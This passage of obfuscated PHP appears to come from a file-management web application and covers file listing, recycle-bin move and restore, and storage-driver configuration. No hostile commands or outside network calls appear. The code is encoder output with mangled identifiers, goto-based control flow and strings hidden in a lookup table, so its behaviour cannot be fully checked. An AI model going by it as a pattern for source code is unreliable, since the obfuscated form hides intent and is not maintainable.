$this->fileTypeProfile($d‹¶„¶ˆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($BÁÓ¼‚‹Á¦, $díòÊğ›“) { goto Dà¶ìğŸ; eáÔåŠ¹Ãï: foreach ($c›ğÜ¢Ô˜Å as $cÛ¥‰êïŒÏ => $b‹Œ‰ò¡Òˆ) { $AŠ¾Ü¯«Ëİ[$eìº“‚·³»[412]] = $this->fileTypeWhere($cÛ¥‰êïŒÏ); $F½À½­ÁôÊ[$cÛ¥‰êïŒÏ] = array($eìº“‚·³»[1972] => $b‹Œ‰ò¡Òˆ[$eìº“‚·³»[28]], $eìº“‚·³»[1973] => $this->where($AŠ¾Ü¯«Ëİ)->count(), $eìº“‚·³»[556] => $this->where($AŠ¾Ü¯«Ëİ)->sum($eìº“‚·³»[78])); } Cache::set($f‰ˆÈÀª², $F½À½­ÁôÊ, 1200); return $F½À½­ÁôÊ; goto Bá¿°œÂ—; EÌ¿¸ŒØƒö: if ($CÜ—®“¦Í) { return $CÜ—®“¦Í; } $AŠ¾Ü¯«Ëİ = array($eìº“‚·³»[554] => 0); if ($BÁÓ¼‚‹Á¦ != !1) { $AŠ¾Ü¯«Ëİ[$eìº“‚·³»[491]] = $BÁÓ¼‚‹Á¦; $AŠ¾Ü¯«Ëİ[$eìº“‚·³»[411]] = $díòÊğ›“; } goto fÂòè°Œß; Dà¶ìğŸ: $eìº“‚·³» =& $_SERVER[Šº]; $f‰ˆÈÀª² = $eìº“‚·³»[1970] . $BÁÓ¼‚‹Á¦ . $eìº“‚·³»[71] . $díòÊğ›“; $CÜ—®“¦Í = Cache::get($f‰ˆÈÀª²); goto EÌ¿¸ŒØƒö; fÂòè°Œß: $F½À½­ÁôÊ = array(); $F½À½­ÁôÊ[$eìº“‚·³»[1971]] = array($eìº“‚·³»[1972] => LNG($eìº“‚·³»[1971]), $eìº“‚·³»[1973] => $this->where($AŠ¾Ü¯«Ëİ)->count(), $eìº“‚·³»[556] => $this->where($AŠ¾Ü¯«Ëİ)->sum($eìº“‚·³»[78])); $c›ğÜ¢Ô˜Å = KodIO::fileTypeList(); goto eáÔåŠ¹Ãï; Bá¿°œÂ—: } public function fileNameExist($e°™ğ‡†øç, $C·ÜÃ·†¿Ï) { $f£á„×ÆÇË =& $_SERVER[Šº]; $eğöàİ• = $this->where(array($f£á„×ÆÇË[485] => $e°™ğ‡†øç, $f£á„×ÆÇË[28] => $C·ÜÃ·†¿Ï))->find(); return is_array($eğöàİ•) ? $eğöàİ•[$f£á„×ÆÇË[403]] : !1; } public function childList($c½Í«Æ·—ƒ) { goto bé—Î‡½Ñ¯; bÏâÏİ¬Œ£: $Cİµáµªé = array($cª·ˆ†áİ[485] => intval($c½Í«Æ·—ƒ), $cª·ˆ†áİ[430] => 0); $D‰å”°ÓÏ = $this->where($Cİµáµªé)->select(); $D‰å”°ÓÏ = $D‰å”°ÓÏ ? $D‰å”°ÓÏ : array(); goto cé½óó”; cé½óó”: self::$cacheChildList[$Aè ©„á®Ø] = $D‰å”°ÓÏ; foreach ($D‰å”°ÓÏ as $eğÍù¤Ÿğ) { $Aè ©„á®Ø = $cª·ˆ†áİ[445] . $eğÍù¤Ÿğ[$cª·ˆ†áİ[403]]; self::$cacheSourceInfo[$Aè ©„á®Ø] = $eğÍù¤Ÿğ; } return $D‰å”°ÓÏ; goto dŠÚ¥ÕÓÆ¾; bé—Î‡½Ñ¯: $cª·ˆ†áİ =& $_SERVER[Šº]; $Aè ©„á®Ø = $cª·ˆ†áİ[1947] . $c½Í«Æ·—ƒ; if (isset(self::$cacheChildList[$Aè ©„á®Ø])) { return self::$cacheChildList[$Aè ©„á®Ø]; } goto bÏâÏİ¬Œ£; dŠÚ¥ÕÓÆ¾: } public function fileNameAuto($bèëÅˆôÇ¹, $BÊ¸ÑÍ¹’, $EÃ»ëêŸ×· = REPEAT_RENAME, $bòÔÏ®Í“ˆ = false) { $C¦ÂíÛµ©¸ =& $_SERVER[Šº]; $f–›¤’£øª = $this->field($C¦ÂíÛµ©¸[28])->where(array($C¦ÂíÛµ©¸[485] => $bèëÅˆôÇ¹, $C¦ÂíÛµ©¸[28] => array($C¦ÂíÛµ©¸[379], $BÊ¸ÑÍ¹’ . $C¦ÂíÛµ©¸[380])))->select(); $F¼Ú¨ô—× = array_to_keyvalue($f–›¤’£øª, $C¦ÂíÛµ©¸[33], $C¦ÂíÛµ©¸[28]); return $this->fileNameAutoGet($F¼Ú¨ô—×, $BÊ¸ÑÍ¹’, $EÃ»ëêŸ×·, $bòÔÏ®Í“ˆ); } public function fileNameAutoGet($Aœç÷ç÷©İ, $cÄºè¿£ˆ­, $D¬Ÿ²Í•ã, $dÌÇ…Õª õ) { $D†¥ƒ‰È‰ =& $_SERVER[Šº]; if ($D¬Ÿ²Í•ã == REPEAT_REPLACE || !$Aœç÷ç÷©İ || !in_array_not_case($cÄºè¿£ˆ­, $Aœç÷ç÷©İ) || $dÌÇ…Õª õ && $D¬Ÿ²Í•ã != REPEAT_RENAME_FOLDER) { return $cÄºè¿£ˆ­; } if ($D¬Ÿ²Í•ã == REPEAT_SKIP) { return !1; } $b×‰¾¨ÌØ = $D†¥ƒ‰È‰[95] . get_path_ext($cÄºè¿£ˆ­); $b×‰¾¨ÌØ = $b×‰¾¨ÌØ == $D†¥ƒ‰È‰[95] || $dÌÇ…Õª õ ? $D†¥ƒ‰È‰[33] : $b×‰¾¨ÌØ; for ($aĞêñ„ÇÓæ = 1; $aĞêñ„ÇÓæ <= count($Aœç÷ç÷©İ) + 1; $aĞêñ„ÇÓæ++) { $aì·ÇŸ™¬ = substr($cÄºè¿£ˆ­, 0, strlen($cÄºè¿£ˆ­) - strlen($b×‰¾¨ÌØ)); $cÀ„»²ôŒÙ = $aì·ÇŸ™¬ . "\x28{$aĞêñ„ÇÓæ}\51{$b×‰¾¨ÌØ}"; if (!in_array_not_case($cÀ„»²ôŒÙ, $Aœç÷ç÷©İ)) { return $cÀ„»²ôŒÙ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\x63\145\x5f\x72\145\x63\x79\143\154\x65"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\151\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\164\151\157\156")); public function listData($BİºÏÅ´† = false) { $F‹ĞùÖéİŠ =& $_SERVER[Šº]; $BİºÏÅ´† = $BİºÏÅ´† ? $BİºÏÅ´† : USER_ID; $C„Ğ‚ôøñÜ = $this->where(array($F‹ĞùÖéİŠ[1506] => $BİºÏÅ´†))->select(); return array_to_keyvalue($C„Ğ‚ôøñÜ, $F‹ĞùÖéİŠ[33], $F‹ĞùÖéİŠ[403]); } public function moveToRecycle($d¬è¾¬±”Ó) { goto cîÃÈÑ¸°—; B¹¢âÃÜã: if (!$CÔ¼«¾¨­ª || $CÔ¼«¾¨­ª[$F–Àğã«ŸÃ[430]] == $F–Àğã«ŸÃ[87]) { return; } $eÏ§†ŞìØç = array($F–Àğã«ŸÃ[417] => $d¬è¾¬±”Ó, $F–Àğã«ŸÃ[1506] => USER_ID, $F–Àğã«ŸÃ[557] => $CÔ¼«¾¨­ª[$F–Àğã«ŸÃ[411]], $F–Àğã«ŸÃ[558] => $CÔ¼«¾¨­ª[$F–Àğã«ŸÃ[491]], $F–Àğã«ŸÃ[561] => $CÔ¼«¾¨­ª[$F–Àğã«ŸÃ[494]]); $this->add($eÏ§†ŞìØç); goto a‚ÓÖ™éŒÉ; a‚ÓÖ™éŒÉ: $this->recycleMove($d¬è¾¬±”Ó, 1); if ($CÔ¼«¾¨­ª[$F–Àğã«ŸÃ[410]] == $F–Àğã«ŸÃ[87]) { $FÇ—·œË‘µ = array($F–Àğã«ŸÃ[561] => array($F–Àğã«ŸÃ[520], $CÔ¼«¾¨­ª[$F–Àğã«ŸÃ[494]] . $d¬è¾¬±”Ó . $F–Àğã«ŸÃ[521])); $F±°Ôëâ³˜->where($FÇ—·œË‘µ)->setField($F–Àğã«ŸÃ[430], 1); } goto a˜¥Ü³›ãù; cîÃÈÑ¸°—: $F–Àğã«ŸÃ =& $_SERVER[Šº]; $F±°Ôëâ³˜ = Model($F–Àğã«ŸÃ[1192]); $CÔ¼«¾¨­ª = $F±°Ôëâ³˜->sourceInfo($d¬è¾¬±”Ó); goto B¹¢âÃÜã; a˜¥Ü³›ãù: } public function clear() { $this->remove(!1); } public function remove($BÂ…æÒğÈ’ = false, $e–§ÚªƒÓÍ = false) { goto dŠÕñ¡Æ®Ç; Dôè¦ô×œî: $aï¨’…ÀïÉ = $this->listData($e–§ÚªƒÓÍ); $BÂ…æÒğÈ’ = $BÂ…æÒğÈ’ === !1 ? !1 : $BÂ…æÒğÈ’; $b×õê“¦Ò = array(); goto c„ÆÎ¯ÒœÍ; dŠÕñ¡Æ®Ç: $AÉ‘²Œ‡Ã =& $_SERVER[Šº]; $e–§ÚªƒÓÍ = $e–§ÚªƒÓÍ ? $e–§ÚªƒÓÍ : USER_ID; $C›ª¤¶õÍö = Model($AÉ‘²Œ‡Ã[1192]); goto Dôè¦ô×œî; c„ÆÎ¯ÒœÍ: foreach ($aï¨’…ÀïÉ as $E‹˜ÙŒ¯À) { if ($BÂ…æÒğÈ’ != !1 && !in_array($E‹˜ÙŒ¯À, $BÂ…æÒğÈ’)) { continue; } $bÜÃñ¦Ê = $C›ª¤¶õÍö->sourceInfo($E‹˜ÙŒ¯À); $C›ª¤¶õÍö->remove($E‹˜ÙŒ¯À, !1); $Eè´¼ˆ”ÖÀ = $bÜÃñ¦Ê[$AÉ‘²Œ‡Ã[411]] . $AÉ‘²Œ‡Ã[71] . $bÜÃñ¦Ê[$AÉ‘²Œ‡Ã[491]]; $b×õê“¦Ò[$Eè´¼ˆ”ÖÀ] = array($AÉ‘²Œ‡Ã[557] => $bÜÃñ¦Ê[$AÉ‘²Œ‡Ã[411]], $AÉ‘²Œ‡Ã[491] => $bÜÃñ¦Ê[$AÉ‘²Œ‡Ã[491]]); $this->where(array($AÉ‘²Œ‡Ã[403] => $E‹˜ÙŒ¯À))->delete(); } foreach ($b×õê“¦Ò as $Aî¯ïˆÛ¼‡) { $C›ª¤¶õÍö->targetSpaceUpdate($Aî¯ïˆÛ¼‡[$AÉ‘²Œ‡Ã[411]], $Aî¯ïˆÛ¼‡[$AÉ‘²Œ‡Ã[491]]); } goto d¹¸Æ‚Íêï; d¹¸Æ‚Íêï: } public function restore($a„ÕÌŠ±ùÆ = false) { $BÊµàà¼¼ = $this->listData(); $this->_restoreSource($BÊµàà¼¼, $a„ÕÌŠ±ùÆ); } public function removeUserAll($E´„Ò—°¿Ø) { $this->remove(!1, $E´„Ò—°¿Ø); } private function _restoreSource($C¥Ò×Ğ†–¹, $fïË›ì™Ç) { goto dŠÍŸšŒÕ·; d¸øäÉ±à: if (!$C¥Ò×Ğ†–¹) { return !0; } $dßµ²æ‹ÑÜ = array(); foreach ($C¥Ò×Ğ†–¹ as $fï¥¿øÚÚÈ) { goto cØğôƒï¤Ê; cï¾—õ‹Ÿó: $dßµ²æ‹ÑÜ[] = $aè¡ŸÖ¼ˆí[$d•éÈ’¶†º[485]]; if ($aè¡ŸÖ¼ˆí[$d•éÈ’¶†º[410]] == $d•éÈ’¶†º[87]) { $dßµ²æ‹ÑÜ[] = $fï¥¿øÚÚÈ; } $EÑØå­« ±->lockMoveEnd($fï¥¿øÚÚÈ); goto FÙĞ×›Ù§; CÊ½µ„¶íŠ: if ($B¼±ºØ¡Ö [$d•éÈ’¶†º[430]] == $d•éÈ’¶†º[87]) { continue; } $EÑØå­« ±->lockMoveStart($fï¥¿øÚÚÈ); $this->recycleMove($fï¥¿øÚÚÈ, 0); goto EáÏùëÔù; EáÏùëÔù: if ($aè¡ŸÖ¼ˆí[$d•éÈ’¶†º[410]] == $d•éÈ’¶†º[87]) { $A·µãì¥êá = array($d•éÈ’¶†º[561] => array($d•éÈ’¶†º[520], $aè¡ŸÖ¼ˆí[$d•éÈ’¶†º[494]] . $fï¥¿øÚÚÈ . $d•éÈ’¶†º[521])); $EÑØå­« ±->where($A·µãì¥êá)->setField($d•éÈ’¶†º[430], 0); $this->restoreFolderChildren($fï¥¿øÚÚÈ, $C¥Ò×Ğ†–¹); } $this->where(array($d•éÈ’¶†º[403] => $fï¥¿øÚÚÈ))->delete(); $EÑØå­« ±->folderSizeReset($aè¡ŸÖ¼ˆí[$d•éÈ’¶†º[485]]); goto cï¾—õ‹Ÿó; cØğôƒï¤Ê: if ($fïË›ì™Ç != !1 && !in_array($fï¥¿øÚÚÈ, $fïË›ì™Ç)) { continue; } $aè¡ŸÖ¼ˆí = $EÑØå­« ±->sourceInfo($fï¥¿øÚÚÈ); $B¼±ºØ¡Ö  = $EÑØå­« ±->sourceInfo($aè¡ŸÖ¼ˆí[$d•éÈ’¶†º[485]]); goto CÊ½µ„¶íŠ; FÙĞ×›Ù§: } goto Dî–â£³’Ì; Dî–â£³’Ì: $EÑØå­« ±->updateModifyTime($dßµ²æ‹ÑÜ); goto f¹ìë´Á•»; dŠÍŸšŒÕ·: $d•éÈ’¶†º =& $_SERVER[Šº]; $EÑØå­« ± = Model($d•éÈ’¶†º[1192]); $fïË›ì™Ç = $fïË›ì™Ç == !1 ? !1 : $fïË›ì™Ç; goto d¸øäÉ±à; f¹ìë´Á•»: } private function restoreFolderChildren($AŸŒ²—‰Ù, $f¼µëƒê‘) { goto A‡Œ»Ø‡äó; FİÔÏ“õÖ: foreach ($f¼µëƒê‘ as $CÑ¢ˆß×ğÒ) { if ($CÑ¢ˆß×ğÒ == $AŸŒ²—‰Ù) { continue; } if (!$b®™ÔÜÅÌç->isParentOf($AŸŒ²—‰Ù, $CÑ¢ˆß×ğÒ)) { continue; } $AÖ«ß™­ï = $b®™ÔÜÅÌç->sourceInfo($CÑ¢ˆß×ğÒ); if ($AÖ«ß™­ï[$AÚ¥ÅÖÍà¤[410]] == $AÚ¥ÅÖÍà¤[87]) { $DˆÖáä¯Õ[] = array($AÚ¥ÅÖÍà¤[561] => array($AÚ¥ÅÖÍà¤[520], $AÖ«ß™­ï[$AÚ¥ÅÖÍà¤[494]] . $CÑ¢ˆß×ğÒ . $AÚ¥ÅÖÍà¤[521])); } else { $DˆÖáä¯Õ[$AÚ¥ÅÖÍà¤[403]][1][] = $CÑ¢ˆß×ğÒ; } } if (!$DˆÖáä¯Õ[$AÚ¥ÅÖÍà¤[403]][1]) { unset($DˆÖáä¯Õ[$AÚ¥ÅÖÍà¤[403]]); } if (!$DˆÖáä¯Õ) { return; } goto eÉÈ¼ë°¨Â; A‡Œ»Ø‡äó: $AÚ¥ÅÖÍà¤ =& $_SERVER[Šº]; $b®™ÔÜÅÌç = Model($AÚ¥ÅÖÍà¤[1192]); $DˆÖáä¯Õ = array($AÚ¥ÅÖÍà¤[403] => array($AÚ¥ÅÖÍà¤[7], array())); goto FİÔÏ“õÖ; eÉÈ¼ë°¨Â: $DˆÖáä¯Õ[$AÚ¥ÅÖÍà¤[403]][1] = array_unique($DˆÖáä¯Õ[$AÚ¥ÅÖÍà¤[403]][1]); $DˆÖáä¯Õ[$AÚ¥ÅÖÍà¤[945]] = $AÚ¥ÅÖÍà¤[1764]; $b®™ÔÜÅÌç->where($DˆÖáä¯Õ)->setField($AÚ¥ÅÖÍà¤[430], 1); goto e½À¬¨º´–; e½À¬¨º´–: } private function recycleMove($AÔ»…¾¤©Æ, $fİ¼â­œí = 1) { $c¥ÜÍÃ°¾• =& $_SERVER[Šº]; $FØ¡¢ñ™‘‡ = Model($c¥ÜÍÃ°¾•[1192]); $Añëì = Model($c¥ÜÍÃ°¾•[1974]); $A¿ÀŞ“èÍá = array($c¥ÜÍÃ°¾•[403] => $AÔ»…¾¤©Æ); if ($fİ¼â­œí) { $FØ¡¢ñ™‘‡->where($A¿ÀŞ“èÍá)->setField($c¥ÜÍÃ°¾•[430], 1); $Añëì->eventRecycle($AÔ»…¾¤©Æ, $c¥ÜÍÃ°¾•[1975]); } else { $D¥ì„ÓÎá© = $FØ¡¢ñ™‘‡->where($A¿ÀŞ“èÍá)->find(); $D§™’àõÜ = $D¥ì„ÓÎá©[$c¥ÜÍÃ°¾•[410]] == $c¥ÜÍÃ°¾•[87]; $F½‰Ş“ØÉŞ = $FØ¡¢ñ™‘‡->fileNameAuto($D¥ì„ÓÎá©[$c¥ÜÍÃ°¾•[485]], $D¥ì„ÓÎá©[$c¥ÜÍÃ°¾•[28]], REPEAT_RENAME_FOLDER, $D§™’àõÜ); if ($F½‰Ş“ØÉŞ != $D¥ì„ÓÎá©[$c¥ÜÍÃ°¾•[28]]) { $FØ¡¢ñ™‘‡->rename($AÔ»…¾¤©Æ, $F½‰Ş“ØÉŞ); } $FØ¡¢ñ™‘‡->where($A¿ÀŞ“èÍá)->setField($c¥ÜÍÃ°¾•[430], 0); $Añëì->eventRecycle($AÔ»…¾¤©Æ, $c¥ÜÍÃ°¾•[1976]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x73\x74\x6f\162\x61\x67\145\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\163\x69\x7a\145\115\x61\x78", "\163\x79\163\x74\145\x6d", "\144\x65\x66\141\165\x6c\164", "\x64\x72\x69\166\x65\162", "\x63\x6f\156\146\151\x67"); public function listData($FË§™³–ƒ¨ = false, $aƒÛ¨Ü¼âÓ = "\155\x6f\x64\x69\x66\x79\124\151\x6d\145", $DÊõ ›° = false) { $aØ‡Êò÷Ÿ =& $_SERVER[Šº]; $dó‡Î·¥­¬ = parent::listData($FË§™³–ƒ¨, $aƒÛ¨Ü¼âÓ, $DÊõ ›°); if ($FË§™³–ƒ¨) { return $dó‡Î·¥­¬; } $bÛ´ÔÆÍˆ = $this->ioSizeUseGet(array_to_keyvalue($dó‡Î·¥­¬, $aØ‡Êò÷Ÿ[33], $aØ‡Êò÷Ÿ[392])); foreach ($dó‡Î·¥­¬ as $Fóò‹ƒ£Ç‰ => $b«šŠİ·¾ç) { unset($dó‡Î·¥­¬[$Fóò‹ƒ£Ç‰][$aØ‡Êò÷Ÿ[6]]); $dó‡Î·¥­¬[$Fóò‹ƒ£Ç‰][$aØ‡Êò÷Ÿ[1663]] = isset($bÛ´ÔÆÍˆ[$b«šŠİ·¾ç[$aØ‡Êò÷Ÿ[392]]]) ? $bÛ´ÔÆÍˆ[$b«šŠİ·¾ç[$aØ‡Êò÷Ÿ[392]]] : 0; } return $dó‡Î·¥­¬; } public function ioSizeUseGet($b¨æµ›ïßà) { goto f„ÛÈÁ™Ç; c÷çĞÔ¿âí: $A½˜·Î÷‘â = Cache::get($CïÓ¥ç‚½“); if ($A½˜·Î÷‘â) { return $A½˜·Î÷‘â; } $cŒ‘ìÑ¹ƒ = array($EíÉµ¿Àè[780] => $EíÉµ¿Àè[392], $EíÉµ¿Àè[1978] => $EíÉµ¿Àè[78]); goto a¢¡ÕÊ¯‰¿; a¢¡ÕÊ¯‰¿: $D¥ØÂŞôÈ = array($EíÉµ¿Àè[780] => array($EíÉµ¿Àè[7], $b¨æµ›ïßà)); $A½˜·Î÷‘â = Model($EíÉµ¿Àè[745])->field($cŒ‘ìÑ¹ƒ)->where($D¥ØÂŞôÈ)->group($EíÉµ¿Àè[780])->select(); $A½˜·Î÷‘â = array_to_keyvalue($A½˜·Î÷‘â, $EíÉµ¿Àè[392], $EíÉµ¿Àè[78]); goto A‰†””ù; f„ÛÈÁ™Ç: $EíÉµ¿Àè =& $_SERVER[Šº]; if (!$b¨æµ›ïßà) { return array(); } $CïÓ¥ç‚½“ = $EíÉµ¿Àè[1977] . implode($EíÉµ¿Àè[47], $b¨æµ›ïßà); goto c÷çĞÔ¿âí; A‰†””ù: Cache::set($CïÓ¥ç‚½“, $A½˜·Î÷‘â, 600); return $A½˜·Î÷‘â; goto cç¬¤Á‚Ù; cç¬¤Á‚Ù: } public function getConfig($dÛ¦³”Õ¡) { $EºÅ¥ÈÈ‘ß = parent::listData($dÛ¦³”Õ¡); return json_decode($EºÅ¥ÈÈ‘ß[$_SERVER[Šº][6]], !0); } public function update($Fîœí’·É, $dãæù‰ÍÌ¿) { goto c‰™œ„Œ¸Ø; EÄ¦ÆæùÌ: $a†®ñÕ´ÃŸ = parent::update($Fîœí’·É, $dãæù‰ÍÌ¿); if ($a†®ñÕ´ÃŸ && $dãæù‰ÍÌ¿[$Bù¶ğ…Í·Ñ[34]]) { foreach ($aæš±À‹í as $b¿ì‰ŞÛ³ñ) { if ($b¿ì‰ŞÛ³ñ[$Bù¶ğ…Í·Ñ[34]] && $b¿ì‰ŞÛ³ñ[$Bù¶ğ…Í·Ñ[392]] != $Fîœí’·É) { parent::update($b¿ì‰ŞÛ³ñ[$Bù¶ğ…Í·Ñ[392]], array($Bù¶ğ…Í·Ñ[34] => 0)); } } } return $a†®ñÕ´ÃŸ; goto dÅå„È¥»; c‰™œ„Œ¸Ø: $Bù¶ğ…Í·Ñ =& $_SERVER[Šº]; $FïêÉ•¥ø = $dãæù‰ÍÌ¿[$Bù¶ğ…Í·Ñ[28]]; $aæš±À‹í = array_to_keyvalue(parent::listData(), $Bù¶ğ…Í·Ñ[28]); goto B£œ©øíğ; B£œ©øíğ: if (isset($aæš±À‹í[$FïêÉ•¥ø]) && $aæš±À‹í[$FïêÉ•¥ø][$Bù¶ğ…Í·Ñ[392]] != $Fîœí’·É) { return !1; } if (isset($dãæù‰ÍÌ¿[$Bù¶ğ…Í·Ñ[1979]]) && $dãæù‰ÍÌ¿[$Bù¶ğ…Í·Ñ[1979]] == $Bù¶ğ…Í·Ñ[87]) { $this->checkConfig($dãæù‰ÍÌ¿); } unset($dãæù‰ÍÌ¿[$Bù¶ğ…Í·Ñ[1979]]); goto EÄ¦ÆæùÌ; dÅå„È¥»: } public function add($BËŸ‘–¥) { goto EÁ†Šºé…²; A†Ø°çéô: $this->checkConfig($BËŸ‘–¥); $a®è¶²ÇªÕ = parent::insert($BËŸ‘–¥); if ($a®è¶²ÇªÕ && $BËŸ‘–¥[$fçõƒ«ÕÁÑ[34]]) { foreach ($f‘îÔĞÊÙä as $DßÂŸ¢¸ßŠ) { if ($DßÂŸ¢¸ßŠ[$fçõƒ«ÕÁÑ[34]]) { parent::update($DßÂŸ¢¸ßŠ[$fçõƒ«ÕÁÑ[392]], array($fçõƒ«ÕÁÑ[34] => 0)); } } } goto bÁ¯…™Â±Ÿ; bÁ¯…™Â±Ÿ: return $a®è¶²ÇªÕ; goto Dó¹º”„Ë‚; EÁ†Šºé…²: $fçõƒ«ÕÁÑ =& $_SERVER[Šº]; $f‘îÔĞÊÙä = array_to_keyvalue(parent::listData(), $fçõƒ«ÕÁÑ[28]); if (isset($f‘îÔĞÊÙä[$BËŸ‘–¥[$fçõƒ«ÕÁÑ[28]]])) { return !1; } goto A†Ø°çéô; Dó¹º”„Ë‚: } public function checkConfig(&$dí†»øá¬Š) { goto aİ©®Ù™; aİ©®Ù™: $eîÈ‘º¡ªŒ =& $_SERVER[Šº]; $E¯ÏŒËò° = strtolower($dí†»øá¬Š[$eîÈ‘º¡ªŒ[94]]); $C¥§Àˆ…Ğ = json_decode($dí†»øá¬Š[$eîÈ‘º¡ªŒ[6]], !0); goto D½•Œ‡§Ú; a¨ÓÌíè“ø: $dí†»øá¬Š[$eîÈ‘º¡ªŒ[6]] = json_encode($C¥§Àˆ…Ğ); $dí†»øá¬Š[$eîÈ‘º¡ªŒ[94]] = $cœæõåä†‘; return !0; goto FêâÉàïÀ×; D½•Œ‡§Ú: foreach ($C¥§Àˆ…Ğ as $d©™á Ëå÷ => $DĞ×´ñ’õì) { $C¥§Àˆ…Ğ[$d©™á Ëå÷] = trim($DĞ×´ñ’õì); } $C¥§Àˆ…Ğ[$eîÈ‘º¡ªŒ[1980]] = rand_string(6); $fê©×åØ‘… = $GLOBALS[$eîÈ‘º¡ªŒ[6]][$eîÈ‘º¡ªŒ[88]][$eîÈ‘º¡ªŒ[789]]; goto A‡Á¶¡ö¹; BŠÄîÓ: $eÈ¸öù¿¤â = new $C—Ã¡àóêï($C¥§Àˆ…Ğ); if (in_array($E¯ÏŒËò°, $eÈ¸öù¿¤â->objectDriver)) { if (!$eÈ¸öù¿¤â->isBucketCors() && !$eÈ¸öù¿¤â->setBucketCors()) { $C ›ˆÈ„Í = LNG($eîÈ‘º¡ªŒ[1984]); $C ›ˆÈ„Í .= $eîÈ‘º¡ªŒ[1985] . LNG($eîÈ‘º¡ªŒ[1986]); show_json($C ›ˆÈ„Í, !1); } } $a®™‹…¨¸µ = rtrim($C¥§Àˆ…Ğ[$eîÈ‘º¡ªŒ[1064]], $eîÈ‘º¡ªŒ[8]) . $eîÈ‘º¡ªŒ[8]; goto dÃÂ¶¯°ò; A‡Á¶¡ö¹: $cœæõåä†‘ = isset($fê©×åØ‘…[$E¯ÏŒËò°]) ? $fê©×åØ‘…[$E¯ÏŒËò°] : ucfirst($E¯ÏŒËò°); $C—Ã¡àóêï = $eîÈ‘º¡ªŒ[72] . $cœæõåä†‘; if (!$cœæõåä†‘ || !class_exists($C—Ã¡àóêï)) { write_log(array($eîÈ‘º¡ªŒ[1981], $dí†»øá¬Š, get_caller_info()), $eîÈ‘º¡ªŒ[1982]); show_json(LNG($eîÈ‘º¡ªŒ[1983]), !1, $dí†»øá¬Š); } goto BŠÄîÓ; dÃÂ¶¯°ò: $BÍ«„á›³µ = $eÈ¸öù¿¤â->getPath($a®™‹…¨¸µ . $eîÈ‘º¡ªŒ[1125]); if (!$eÈ¸öù¿¤â->mkfile($BÍ«„á›³µ)) { show_json(LNG($eîÈ‘º¡ªŒ[1984]), !1); } $C¥§Àˆ…Ğ[$eîÈ‘º¡ªŒ[1064]] = $a®™‹…¨¸µ; goto a¨ÓÌíè“ø; FêâÉàïÀ×: } public function driverListSystem() { $fÄê±œë†ã =& $_SERVER[Šº]; $A¨‡Ÿ°ò½í = parent::listData(); $aôçš¼ØŒÙ = array(); foreach ($A¨‡Ÿ°ò½í as $D¬¾„İÒùå) { unset($D¬¾„İÒùå[$fÄê±œë†ã[193]], $D¬¾„İÒùå[$fÄê±œë†ã[84]]); $D¬¾„İÒùå[$fÄê±œë†ã[6]] = json_decode($D¬¾„İÒùå[$fÄê±œë†ã[6]], !0); $aôçš¼ØŒÙ[] = $D¬¾„İÒùå; } return $aôçš¼ØŒÙ; } public function defaultDriver() { $Fµì¶£æ·± =& $_SERVER[Šº]; $B¶‘«ÆãŠß = parent::listData(); $dØ£òµ—ó‹ = array_filter_by_field($B¶‘«ÆãŠß, $Fµì¶£æ·±[34], 1); $dØ£òµ—ó‹ = $dØ£òµ—ó‹[0]; if ($dØ£òµ—ó‹) { $dØ£òµ—ó‹[$Fµì¶£æ·±[6]] = json_decode($dØ£òµ—ó‹[$Fµì¶£æ·±[6]], !0); } return $dØ£òµ—ó‹; } public function driverInfo($Cõ™”«—×­) { $BÉŒÑ°¿¸ =& $_SERVER[Šº]; $FéîÅê‘˜ = array_to_keyvalue(parent::listData(), $BÉŒÑ°¿¸[392]); if (!isset($FéîÅê‘˜[$Cõ™”«—×­])) { return !1; } $dÎå«œ‹ = $FéîÅê‘˜[$Cõ™”«—×­]; $dÎå«œ‹[$BÉŒÑ°¿¸[6]] = json_decode($dÎå«œ‹[$BÉŒÑ°¿¸[6]], !0); return $dÎå«œ‹; } public function remove($fÀñ½½­ïó) { $this->removeShareItems($fÀñ½½­ïó); return parent::remove($fÀñ½½­ïó); } public function removeWithFile($dè…‹íÜÚ¸, $eÕô½§†‹Œ) { goto fŠ™ÑÛÛÃ; B°ĞŞ±ƒ²Ú: $dáŠ°«¥ö = "\173\151\x6f\x3a{$DŞÀòŒÍæÍ}\175\57"; $B¥ªƒ²¡¾¶ = !0; $Báò¼ì·ó² = array(); goto B§ÓœìªŸŠ; B§ÓœìªŸŠ: $eÆ‡ÆİØƒ£ = Model($A†´èâ[192])->where($E¿¤–øÔÑ)->field($A†´èâ[1989])->select(); foreach ($eÆ‡ÆİØƒ£ as $C¯ÕôŒ‹°) { goto d™Ó¬–—Ó; cŠÓÌ½ÄµÃ: if (IO::exist($AÑˆË¦ÖˆÕ)) { $A¹‚‹©ôî”->updateFileEnd($C¯ÕôŒ‹°[$A†´èâ[28]], $C¯ÕôŒ‹°[$A†´èâ[78]]); continue; } if (!IO::move($AÀÂß±Ôßƒ, get_path_father($AÑˆË¦ÖˆÕ))) { $B¥ªƒ²¡¾¶ = !1; break; } $E¿¤–øÔÑ = array($A†´èâ[454] => $C¯ÕôŒ‹°[$A†´èâ[454]]); goto Dœñ»¤·¾ç; Dœñ»¤·¾ç: $Eˆ¾ë…ô© = array($A†´èâ[780] => $DŞÀòŒÍæÍ, $A†´èâ[76] => $AÑˆË¦ÖˆÕ); Model($A†´èâ[192])->where($E¿¤–øÔÑ)->save($Eˆ¾ë…ô©); goto AŸäØ›²¯Š; d™Ó¬–—Ó: $AÀÂß±Ôßƒ = $C¯ÕôŒ‹°[$A†´èâ[76]]; $AÑˆË¦ÖˆÕ = $dáŠ°«¥ö . str_replace("\x7b\151\157\72{$dè…‹íÜÚ¸}\x7d\57", $A†´èâ[33], $AÀÂß±Ôßƒ); if (!IO::exist($AÀÂß±Ôßƒ)) { $Báò¼ì·ó²[] = $C¯ÕôŒ‹°[$A†´èâ[454]]; $A¹‚‹©ôî”->updateFileEnd($C¯ÕôŒ‹°[$A†´èâ[28]], $C¯ÕôŒ‹°[$A†´èâ[78]]); continue; } goto cŠÓÌ½ÄµÃ; AŸäØ›²¯Š: } $this->removeByFileID($Báò¼ì·ó²); goto bÁºŠË“¿Ü; fŠ™ÑÛÛÃ: $A†´èâ =& 